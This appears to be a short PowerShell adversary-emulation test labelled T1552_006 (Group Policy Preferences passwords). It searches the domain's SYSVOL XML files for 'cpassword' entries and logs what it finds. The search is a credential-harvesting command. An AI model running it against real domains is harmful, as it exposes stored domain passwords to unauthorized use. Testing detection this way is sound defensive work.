'***********T1552_006_1---Group Policy Preferences---GPP Passwords (findstr)**********'| Out-File -FilePath $args[0]
cmd.exe /c 'findstr /S cpassword %logonserver%\sysvol\*.xml' |  Out-File -FilePath $args[0] -Append
